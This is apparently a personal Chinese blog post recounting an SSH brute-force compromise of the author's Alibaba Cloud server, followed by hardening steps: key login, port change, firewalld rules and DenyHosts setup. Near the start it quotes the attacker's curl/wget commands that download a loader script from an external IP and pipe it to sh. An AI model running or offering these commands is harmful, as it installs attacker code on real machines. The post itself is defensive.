---
title: 我的服务器被暴力破解
date: 2022-01-03 20:30:21
tags: 
- 记录
top_img: /img/15.jpg
#cover: https://s2.loli.net/2022/01/03/dOe1bnlyX2jRfgp.png
cover: https://s2.loli.net/2022/01/03/FEqAMmPWH18LeGY.png
---
> 新手刚接触ECS云服务器还不懂需要做些什么，只能见招拆招了。今天服务器遭受SSH暴力破解，所以整理一些东西让遇到这些问题的人可以减少这个烦恼，废话不多说进入正题。
起因：
手机收到阿里云提示短信，检测到ECS服务器出现紧急安全事件：访问恶意下载源

## 一、具体事件
服务器被恶意攻击，是人性的泯灭还是道德的沦丧，咱就是说才买几天的服务器，就挂了个人博客的项目，不至于吧，不至于吧！HXD？！！服务器格式化了，项目得重新部署了.....fffffffffffff
自己的阿里云服务器被别有用心的人gank一波，服务器被暴力破解密码并且异地登录，然后我就收到了阿里云发的服务器异地登录短信，打开手机查看阿里云，好家伙，五个安全警告，有三个是恶意脚本代码执行的警告，分别执行了`curl`，`bash`以及`wget`命令，具体命令行代码分别如下：

```bash
curl -k --user-agent e842c5c9_root:Root1234 http://194.145.227.21/ldr.sh
```

```curl
bash -c (curl -k --user-agent e842c5c9_root:Root1234 http://194.145.227.21/ldr.sh||wget --no-check-certificate --user-agent e842c5c9_root:Root1234 
-q -O- http://194.145.227.21/ldr.sh)|sh
```

```wget
wget --no-check-certificate --user-agent e842c5c9_root:Root1234 -q -O- http://194.145.227.21/ldr.sh
```

![6.png](https://s2.loli.net/2022/01/03/WpvSRzAY3LPuKQo.png)

### 执行恶意脚本文件其中一项警告的截图如下：
![7.png](https://s2.loli.net/2022/01/03/jESVpurQkszeCGJ.png)

尝试访问这个网站，`http://194.145.227.21/ldr.sh||wget`，提示木马风险，没敢继续访问。

## 二、如何预防
### 1. 什么是SSH暴力破解攻击？
SSH暴力破解是指攻击者通过密码字典或随机组合密码的方式尝试登陆服务器（针对的是全网机器），这种攻击行为一般不会有明确攻击目标，多数是通过扫描软件直接扫描整个广播域或网段；

### 2. 怎样预防被暴力破解攻击？

    (1)定期检查并修复系统漏洞 
    (2)定期修改SSH密码，或配置证书登陆 
    (3)修改SSH端口 
    (4)禁Ping
    (5)若你长期不需要登陆SSH，请在面板中将SSH服务关闭 
    (6)安装云锁、安全狗等安全软件


> 被入侵后的安全优化建议：
1. 推荐使用 SSH 密钥进行登录，减少暴力破解的风险。登录服务器控制台，然后创建密钥对，然后下载私钥到本地；然后与实例进行绑定，当然也可以在这边进行解绑，删除（注意一定是在关机的情况下才能进行）
```bash
#进入服务器-网络与安全-密钥对-创建密钥对，创建成功后记得绑定实例，并下载给的密钥做好备份，这个只能下载一次！

#我用的是finalShell，在新建连接的时候，用户身份验证栏的方法选择Public Key，用户密钥点击浏览，选择刚刚下载的密钥导入即可

#如果ECS实例原先使用密码认证，绑定密钥对后，密码验证方式自动失效。
#也可以手动禁用，登录成功后修改配置文件，禁用密码登录验证方式
$ vim /etc/ssh/sshd_config
#添加：PasswordAuthentication no  
```
2. 在服务器内编辑/etc/ssh/sshd_config文件中的 Port 22，将 22 修改为其他非默认端口，修改之后重启 SSH 服务。可使用如下命令重启：
```bash
/etc/init.d/sshd restart（CentOS）或 /etc/init.d/ssh restart（Debian/Ubuntu）
##也可以使用宝塔面板该端口，安全-SSH端口，修改为你想要的端口，修改完去控制台放行端口即可。
```
3. 无论应用程序管理后台（网站、中间件、tomcat 等）、远程 SSH、远程桌面、数据库，都建议设置复杂且不一样的密码。
4. 删除异常账号
检查：使用last命令查看下服务器近期登录的帐户记录，确认是否有可疑 IP 登录过机器。
解决：检查发现有可疑用户时，可使用命令usermod -L 用户名禁用用户或者使用命令userdel -r 用户名删除用户。

## 三、CentOS7系统的云服务器如果设置防火墙

我使用的是CentOS 8系统，7的配置请参考阿里云官方文档：[点这里](https://help.aliyun.com/knowledge_detail/41317.html)


## 四、CentOS 8开启防火墙
防火墙在CentOS8是默认安装的，所以安装跳过。
### 1. 防火墙状态查看
 阿里云默认防火墙是关闭的，可以通过两个命令查看当前防火墙状态：
 (1)防火墙:
 ```bash
firewall-cmd --state
```
 (2)系统服务管理命令:
 ```bash
 systemctl status firewalld
 ```
### 2. 开启防火墙
我这里就从开启防火墙开始：
```bash
systemctl start firewalld
```
对应的关闭防火墙命令是
```bash
systemctl stop firewalld
```
### 3. 配置防火墙
接下来就是配置防火墙放行规则
```bash
firewall-cmd --add-port=80/tcp --permanent

firewall-cmd --add-port=443/tcp --permanent
```
这里放行了80端口和443端口，用于web服务器，并且支持https必须要开启443端口。
```bash
--permanent 参数表示该条规则永久生效
```
如果你想放行的端口号是连贯的，也可以直接指定范围，例如：
firewall-cmd --add-port=8080-8888/tcp --permanent
如果配置错了，还可以取消：
```bsah
firewall-cmd --remove-port=80/tcp --permanent

firewall-cmd --remove-port=443/tcp --permanent

firewall-cmd --remove-port=8080-8888/tcp --permanent
```
当我们添加或移除防火墙规则后，需重新加载才能生效，使用--reload参数：
```bash
firewall-cmd --reload
```
配置好后我们可以通过--list-all参数查看防火墙规则：
```bash
firewall-cmd --list-all
```
### 4. 使防火墙在系统重启后还能正常运行
设置防火墙开机自启
```bash
systemctl enable firewalld
```
如果只开启了防火墙，没有设置防火墙开机自启，那么服务器重启后，防火墙会回到关闭状态，可以防止因为防火墙错误原因无法连接服务器的情况。当配置好之后，再设置开机自启，保证防火墙能够正常运行。
取消防火墙开机自启
```bash
systemctl disable firewalld
```
当然了，配置了防火墙开机自启后，你只是关闭了防火墙，而没有取消开机自启，那么防火墙只是临时关闭，在下次服务器重新启动后，防火墙会自动开启回来。如果你是想要完全关闭防火墙，不要忘记运行这条命令。

### 5.防火墙相关知识
``` bash
#firewallan安装
yum install firewalld

#检查防火墙开启状态
firewall-cmd --state

#启动firewall
systemctl start firewalld.service

#设置开机自启
systemctl enable firewalld.service

#重启防火墙
systemctl restart firewalld.service

#在不改变状态的条件下重新加载防火墙
firewall-cmd --reload

#查询服务的启动状态
firewall-cmd --query-service ssh

#查看开放的端口
firewall-cmd --list-ports

#开放端口命令含义:
firewall-cmd --zone=public --add-port=3306/tcp --permanent

--zone #作用域
--add-port=80/tcp  #添加端口，格式为：端口/通讯协议
--permanent   #永久生效，没有此参数重启后失效

#firewall-cmd常用参数及作用
参数	　　　　　　　　　　　　　　　　　　　作用
--get-default-zone	　　　　　　　查询默认的区域名称
--set-default-zone=<区域名称>　　　   设置默认的区域，使其永久生效
--get-zones	　　　　　　　　　 　　 显示可用的区域
--get-services	　　　　　　　　　　　　显示预先定义的服务
--get-active-zones	　　　　　　　显示当前正在使用的区域与网卡名称
--add-source=	　　　　　　　　　　　　将源自此IP或子网的流量导向指定的区域
--remove-source=	　　　　　　不再将源自此IP或子网的流量导向某个指定区域
--add-interface=<网卡名称>　　	　将源自该网卡的所有流量都导向某个指定区域
--change-interface=<网卡名称>	  将某个网卡与区域进行关联
--list-all	　　　　　　　　　　显示当前区域的网卡配置参数、资源、端口以及服务等信息
--list-all-zones	　　　　　　显示所有区域的网卡配置参数、资源、端口以及服务等信息
--add-service=<服务名>	　　　　　　设置默认区域允许该服务的流量
--add-port=<端口号/协议>	　　　　　　设置默认区域允许该端口的流量
--remove-service=<服务名>	　　设置默认区域不再允许该服务的流量
--remove-port=<端口号/协议>	　　设置默认区域不再允许该端口的流量
--reload	　　　　　　　　　　让“永久生效”的配置规则立即生效，并覆盖当前的配置规则
--panic-on	　　　　　　　　　　开启应急状况模式
--panic-off	　　　　　　　　　　关闭应急状况模式
```

## 五、安装DenyHosts-2.6预防SSH爆破
### 1.安装DenyHosts-2.6

```bash
#手动下载地址：https://sourceforge.net/projects/denyhosts/files/

#解压源码包
tar zxvf DenyHosts-2.6.tar.gz

#进入安装解压目录
cd DenyHosts-2.6

#安装DenyHosts
python setup.py install  
                                 
#默认安装路径
cd /usr/share/denyhosts/

#denyhosts.cfg为配置文件
cp denyhosts.cfg-dist denyhosts.cfg  

#daemon-control为启动程序
cp daemon-control-dist daemon-control

#添加root权限
chown root daemon-control

#修改为可执行文件
chmod 700 daemon-control

#对daemon-control进行软连接，方便管理
ln -s /usr/share/denyhosts/daemon-control /etc/init.d

#启动denyhosts
/etc/init.d/daemon-control start

#将denghosts设成开机启动
chkconfig daemon-control on
```
> 启动前先将自己的ip加入白名单，不然启动后下一次登陆就给屏蔽了
vim /etc/hosts.allow
添加这行sshd:[你的ip]
检查黑名单是否有自己ip，有则删除
vim /etc/hosts.deny

### 2.denyhosts.cfg配置简要说明
```bash
#编辑配置文件，另外关于配置文件一些参数，通过grep -v "^#" denyhosts.cfg查看
vim /usr/share/denyhosts/denyhosts.cfg

#ssh 日志文件 
SECURE_LOG = /var/log/secure

#redhat的位置
/var/log/secure
#Mandrake、FreeBSD的位置
/var/log/auth.log
#SUSE的位置
var/log/messages

#控制用户登陆的文件
HOSTS_DENY = /etc/hosts.deny 

#过多久后清除已经禁止的，空表示永远不解禁
PURGE_DENY = 

#禁止的服务名，如还要添加其他服务，只需添加逗号跟上相应的服务即可
BLOCK_SERVICE = sshd 

#允许无效用户失败的次数
DENY_THRESHOLD_INVALID = 5 

#允许普通用户登陆失败的次数
DENY_THRESHOLD_VALID = 10 

#允许root登陆失败的次数
DENY_THRESHOLD_ROOT = 1 

#将deny的host或ip纪录到Work_dir中
WORK_DIR = /usr/local/share/denyhosts/data

#假如设定为YES，那么已经设为白名单中的IP登陆失败也会被设为可疑，也会被列入黑名单中，设定NO的意思就相反。
SUSPICIOUS_LOGIN_REPORT_ALLOWED_HOSTS=YES

#是否进行域名反解析
HOSTNAME_LOOKUP=YES 

#程序的进程ID
LOCK_FILE = /var/run/denyhosts.pid 

#管理员邮件地址,它会给管理员发邮件
ADMIN_EMAIL = root@localhost 

```

### 使用denyhosts会将自己的IP自动加到hosts.deny的解决办法

``` bash
#查看denyhosts.cfg配置文件的SECURE_LOG
echo "" > /var/log/secure

#重置系统日志计数器
systemctl restart rsyslog

#到denyhosts的data目录下的其它文件中关于hosts.deny中的IP记录一并清空(也可选择你需要的ip进行删除记录)

#将hosts.deny中你要解禁的IP删除并保存

#重启服务
/usr/share/denyhosts/daemon-control restart
```

## 六、结尾

服务器被暴力破解成功，请尽快排查安全风险，我收到短信就打开阿里云控制台关停了服务器，因为破解成功到脚本命令执行几乎是同时的，没有多想就关闭了服务器，反正就部署了一个项目，然后就将服务器给格式化了，神知道下了什么妖魔鬼怪的木马程序到哪旮沓文件夹下，直接格式化，清净了，等加固了服务器的安全问题，重新部署项目吧。

### 最后，感谢阅读。